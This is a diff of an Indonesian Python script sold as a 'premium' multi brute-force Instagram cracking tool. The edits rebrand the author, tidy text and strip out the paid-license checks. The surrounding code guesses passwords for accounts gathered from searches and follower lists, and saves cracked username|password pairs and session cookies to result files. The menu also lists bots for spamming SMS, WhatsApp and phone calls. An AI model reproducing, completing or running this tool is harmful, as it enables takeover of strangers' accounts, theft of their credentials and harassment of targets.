@@ -1,8 +1,3 @@
-#BrayennnXD ComeBack
-#BrayennnXD Nih Bosss
-#Jangan Lupa Besyukur :)
-
-
 try:
 	import json
 	import uuid
@@ -207,9 +202,9 @@ except:prints(Panel(f'{P2}Sinyal Lu lag Tod Kalo Dah Bagus coba lagi masuk ke to
 def waktu():
 	now = datetime.now()
 	hours = now.hour
-	if 4 <= hours < 12:timenow = "selamat pagi"
-	elif 12 <= hours < 15:timenow = "selamat siang"
-	elif 15 <= hours < 18:timenow = "selamat sore"
+	if 4 <= hours < 12:timenow = "Selamat Pagi"
+	elif 12 <= hours < 15:timenow = "Selamat Siang"
+	elif 15 <= hours < 18:timenow = "Selamat Sore"
 	else:timenow = "selamat malam"
 	return timenow
 
@@ -226,13 +221,13 @@ kontol_rich = random.choice([K2,M2,H2,U2,B2,O2,J2])
 # BANNER
 def banner():
 	os.system("clear")
-	prints(Panel(f"{P2}\tSELAMAT DATANG DI TOLS {color_rich}'Instagram'{P2} MULTI BRUTE FORCE IG",width=80,padding=(0,4),style=f"{color_table}"))
-	prints(Panel(f'''{O2}                     " PREMIUM | Hanzzz"{color_rich}
-_____ _____________  ____________________ {H2}•{P2} Author  : Hana X Ganss {color_rich}
-__  // /__  /___   |/  /__  __ )__  ____/ {H2}•{P2} Facebook: Malezz Isi {color_rich}
-_  // /__  / __  /|_/ /__  __  |_  /_     {H2}•{P2} Status  : {H2}Prem{color_rich}
-/__  __/  /___  /  / / _  /_/ /_  __/     {H2}•{P2} Whatsap : 085786215554{color_rich}
-  /_/  /_____/_/  /_/  /_____/ /_/        {H2}•{P2} Version : 1.0 ''',width=80,padding=(0,2),style=f"{color_table}"))
+	prints(Panel(f"{P2}\tSelamat Datang Di Tools {color_rich}'Instagram'{P2} Multi Brute Force IG",width=80,padding=(0,4),style=f"{color_table}"))
+	prints(Panel(f'''{O2}                     [ Premmium - Dvanmeploph ]{color_rich}
+_____ _____________  ____________________ {H2}•{P2} Author  : Dvanmeploph {color_rich}
+__  // /__  /___   |/  /__  __ )__  ____/ {H2}•{P2} Facebook: Denventa {color_rich}
+_  // /__  / __  /|_/ /__  __  |_  /_     {H2}•{P2} Status  : {H2}Premmium{color_rich}
+/__  __/  /___  /  / / _  /_/ /_  __/     {H2}•{P2} Whatsap : 085797818026{color_rich}
+  /_/  /_____/_/  /_/  /_____/ /_/        {H2}•{P2} Version : 1.4 ''',width=80,padding=(0,2),style=f"{color_table}"))
 
 def process_data():
     sleep(0.08)
@@ -255,7 +250,7 @@ def cekAPI(cookie):
         following=i["edge_follow"]["count"]
         external.append(f'{nama}|{followers}|{following}')
     except  (ValueError,KeyError):
-        prints(Panel(f"{P2}Akun Lu Cp Kontol, Login Pake Akun Larn.",width=80,style=f"{color_table}"));os.system('rm -rf data/.kukis.log rm -rf data/.username');exit()
+        prints(Panel(f"{P2}Akun Lu Cp Kontol, Login Pake Akun Laen.",width=80,style=f"{color_table}"));os.system('rm -rf data/.kukis.log rm -rf data/.username');exit()
 
     return external,user
 
@@ -467,8 +462,8 @@ class instagram:
 				pass
 			banner()
 			prints(Panel(f"{H2}{ng}",title=f"{P2}negara",width=80,padding=(0,33),style=f"{color_table}"))
-			axz.append(Panel(f"""{P2}username  : {H2}{self.username}\n{P2}followers : {H2}{followers}\n{P2}following :{H2} {following}\n{P2}Ip address:{H2} {ip}""",title=f"{P2}data akun",width=38,style=f"{color_table}"))
-			axz.append(Panel(f"""{P2}Info kuota : {H2}{_gep['org']}\n{P2}Zona waktu : {H2}{_gep['timezone']}\n{P2}Kota       : {H2}{_gep['city']}\n{P2}Tanggal    : {H2}{day}""",title=f"{P2}info pengguna",width=39,style=f"{color_table}"))
+			axz.append(Panel(f"""{P2}Username : {H2}{self.username}\n{P2}Followers : {H2}{followers}\n{P2}Following :{H2} {following}\n{P2}IP Address:{H2} {ip}""",title=f"{P2}Data Akun",width=38,style=f"{color_table}"))
+			axz.append(Panel(f"""{P2}Privoder : {H2}{_gep['org']}\n{P2}ZonTime     : {H2}{_gep['timezone']}\n{P2}Kota       : {H2}{_gep['city']}\n{P2}Tanggal    : {H2}{day}""",title=f"{P2}Info Pengguna",width=39,style=f"{color_table}"))
 			console.print(Columns(axz))
 			prints(Panel(f" {H2}{waktu()}",title=f"{P2}waktu",width=80,padding=(0,30),style=f"{color_table}"))
 			prints(Panel(f"{P2}[{color_rich}01{P2}]. crack dari pencarian nama        {P2}[{color_rich}06{P2}]. lihat akun hasil crack\n{P2}[{color_rich}02{P2}]. crack dari pengikut              {P2}[{color_rich}07{P2}]. bot auto unfollow\n{P2}[{color_rich}03{P2}]. crack dari mengikuti             {P2}[{color_rich}08{P2}]. Crack fb ( {H2}new crack{P2} )\n{P2}[{color_rich}04{P2}]. crack ulang hasil cp             {P2}[{color_rich}09{P2}]. Hapus lisensi  {H2}{P2} \n{P2}[{color_rich}05{P2}]. Bot spam target                  {P2}[{color_rich}00{P2}]. keluar ( {M2}hapus cookie{P2} )",width=80,padding=(0,4),style=f"{color_table}"))
@@ -476,13 +471,13 @@ class instagram:
 
 	def hapus_lisensi(self):
 		ask = input(f" apakah anda yakin ingin menghapus lisensi? Y/t : ")
-		if ask in ["y","Y"]:os.system("rm -rf data/lisensi.txt");prints(Panel(f"{P2}succeed menghapus {color_rich}'lisensi'{P2} terima kasih telah menggunakan script BrayennnXD",width=80,style=f"{color_table}"));time.sleep(2);exit()
+		if ask in ["y","Y"]:os.system("rm -rf data/lisensi.txt");prints(Panel(f"{P2}succees menghapus {color_rich}'lisensi'{P2} terima kasih telah menggunakan script Dvanmeploph",width=80,style=f"{color_table}"));time.sleep(2);exit()
 		elif ask in ["t","T"]:self.menu()
 		else:self.hapus_lisensi()
 
 	def Exit(self):
 		x=input(f" apakah anda yakin ingin keluar? Y/t : ")
-		if x in ["y","Y"]:os.system("rm -rf data/.kukis.log rm -rf data/.username");prints(Panel(f"{P2}succeed menghapus {color_rich}'cookie' {P2}terima kasih telah menggunakan script BrayennnXD",width=80,padding=(0,2),style=f"{color_table}"));time.sleep(2);exit()
+		if x in ["y","Y"]:os.system("rm -rf data/.kukis.log rm -rf data/.username");prints(Panel(f"{P2}succeed menghapus {color_rich}'cookie' {P2}terima kasih telah menggunakan script Dvanmeploph",width=80,padding=(0,2),style=f"{color_table}"));time.sleep(2);exit()
 		elif x in ["t","T"]:self.menu()
 		else:self.Exit()
 
@@ -756,12 +751,12 @@ class instagram:
 					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
 					nomor, tanggal = self.ingfo(cookie)
 					tree = Tree("")
-					tree.add(f"{P2}nama akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
-					tree.add(f"{P2}followers : {H2}{pengikut}")
-					tree.add(f"{P2}following : {H2}{mengikut}")
-					tree.add(f"{P2}nomor hp  : {H2}{nomor}")
-					tree.add(f"{P2}postingan : {H2}{postingan}")
-					tree.add(f"{P2}tanggal lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}")
+					tree.add(f"{P2}Nama Akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
+					tree.add(f"{P2}Followers : {H2}{pengikut}")
+					tree.add(f"{P2}Following : {H2}{mengikut}")
+					tree.add(f"{P2}Nomor HP  : {H2}{nomor}")
+					tree.add(f"{P2}Postingan : {H2}{postingan}")
+					tree.add(f"{P2}Tanggal Lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}")
 					prints(tree)
 					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 					success.append(user)
@@ -770,12 +765,12 @@ class instagram:
 				elif 'checkpoint_url' in str(xyaa_code):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
 					tree = Tree("")
-					tree.add(f"{P2}nama akun : {K2}{nama}")
-					tree.add(f"{P2}username  : {K2}{user}")
-					tree.add(f"{P2}password  : {K2}{pw}")
-					tree.add(f"{P2}followers : {K2}{pengikut}")
-					tree.add(f"{P2}following : {K2}{mengikut}")
-					tree.add(f"{P2}postingan : {K2}{postingan}\n")
+					tree.add(f"{P2}Nama Akun : {K2}{nama}")
+					tree.add(f"{P2}Username  : {K2}{user}")
+					tree.add(f"{P2}Password  : {K2}{pw}")
+					tree.add(f"{P2}Followers : {K2}{pengikut}")
+					tree.add(f"{P2}Following : {K2}{mengikut}")
+					tree.add(f"{P2}Postingan : {K2}{postingan}\n")
 					prints(tree)
 					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 					checkpoint.append(user)
@@ -845,7 +840,7 @@ class instagram:
 	├ Followers {CY}{pengikut}
 	├ Following {CY}{mengikut}
 	├ Posts
-  	 ∟ jumlah Post {CY}{postingan}""")
+  	 ∟ Jumlah Post {CY}{postingan}""")
 			elif 'checkpoint_url' in x.text:
 				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
 				print(f"""
@@ -854,7 +849,7 @@ class instagram:
 	├ Followers {K}{pengikut}
 	├ Following {K}{mengikut}
 	├ Posts
-  	 ∟ jumlah Post {K}{postingan}""")
+  	 ∟ Jumlah Post {K}{postingan}""")
 			elif 'Please wait a few minutes' in str(x.text):
 				sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
 				self.checkAPI(usr,pwd)
@@ -943,37 +938,6 @@ class instagram:
 
 		else:
 			self.menu()
-def tlisensi():
-    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
-    time.sleep(2)
-    lisen=input('[•] Masukan Lisensi : ')
-    if lisen in ['']:
-     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
-     tlisensi()
-    if lisen in ['buy','Buy']:
-     os.system('xdg-open https://wa.me/6285888222944?text=Bang+beli+lisensi+IG+nya+dong');exit()
-    loadinglisen()
-    open('.lisen.txt','w').write(lisen)
-    lisensi()
-    
-def lisensi():
- try:
-  cek=open('.lisen.txt').read()
-  lisensikuni.append(cek)
- except:
-  tlisensi()
- ses=requests.Session()
- res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMzYwMTQxMSIsInA3Qld2ZWY3YTdIYjVseS9wWEJmQmxIKzB4a0gybVlEZm8rSkNUSXkiXQ==&ProductId=16362&Key='+lisensikuni[0]).json()
- status=res['licenseKey']['key']
- if status ==cek:
-  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
-  time.sleep(2)
-  lisensiku.append("sukses")
-  login_kamu()
- elif status ==KeyError:
-  os.system('rm .lisen.txt')
- else:
-  tlisensi()
 
 def mengi(self):
 			try:
@@ -1025,52 +989,6 @@ def massal(self):
 			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
 			self.passwordAPI(info)
 
-def key():
-	os.system("clear");banner();key = input(" masukan lisensi : ")
-	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=16754&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi kamu aktif, tolong gunakan tools ini dengan bijak",width=80,padding=(0,4),style=f"{color_table}"));time.sleep(4);login_kamu()
-	except KeyError:
-		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
-
-def cek():
-	try:x=open("data/lisensi.txt","r").read()
-	except FileNotFoundError:key()
-	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s"%(x)).json()['licenseKey']['key'];login_kamu()
-	except KeyError:
-		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
-
-def key():
-	os.system("clear") 
-	banner()
-	prints(Panel(f"{P2}silahkan ketik {H2}'beli'{P2} untuk melihat harga lisensi tools",width=80,padding=(0,9),style=f"{color_table}"))
-	key = input(f" masukan lisensi :{H} ")
-	if key in ["beli","Beli","BELI"]:beli_bang()
-	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi kamu aktif, tolong gunakan tools ini dengan bijak",width=80,padding=(0,4),style=f"{color_table}"));time.sleep(4);login_kamu()
-	except KeyError:
-		prints(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
-				
-def cek():
-	try:x=open("data/lisensi.txt","r").read()
-	except FileNotFoundError:key()
-	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s"%(x)).json()['licenseKey']['key'];login_kamu()
-	except KeyError:
-		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
-	
-def buy_lisenn():
-	try:xz = open("data/lisensi.txt","r").read()
-	except FileNotFoundError:key()
-	os.system("clear");cek()
-	
-def beli_bang():
-    prints(Panel(f"{P2}[{color_rich}01{P2}]. lisensi 1 minggu 50k\n{P2}[{color_rich}02{P2}]. lisensi 1 bulan 100k\n{P2}[{color_rich}03{P2}]. lisensi 2 bulan 150k\n{P2}[{color_rich}04{P2}]. permanen 250k\n{P2}[{color_rich}00{P2}]. keluar ( {M2}tools{P2} )",width=80,padding=(0,22),style=f"{color_table}"))
-    zxc = input(" pilih lisensi : ")
-    if zxc in [""]:prints(Panel(f"{P2}pilih yang bener broo jangan kosong !",width=80,padding=(0,19),style=f"{color_table}"));time.sleep(3);buy_lisenn()
-    elif zxc in ["1","01"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
-    elif zxc in ["2","02"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
-    elif zxc in ["3","03"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+2+bulan");time.sleep(2);exit()
-    elif zxc in ["4","04"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+permanen");time.sleep(2);exit()
-    elif zxc in ["0","00"]:time.sleep(2);exit()
-    else:prints(Panel(f"{P2}ngetik apan ngab !",width=80,padding=(0,28),style=f"{color_table}"));time.sleep(3);buy_lisenn()
-        
 def menu_bot():
 	prints(Panel(f"{P2}[{color_rich}01{P2}] Bot spam SMS              [{color_rich}03{P2}] Bot spam telepon\n[{color_rich}02{P2}] Bot spam WA               [{color_rich}04{P2}] Bot share FB",width=80,padding=(0,8),style=f"{color_table}"))
 	luk = input(f'input 1 sampai 4 : ')
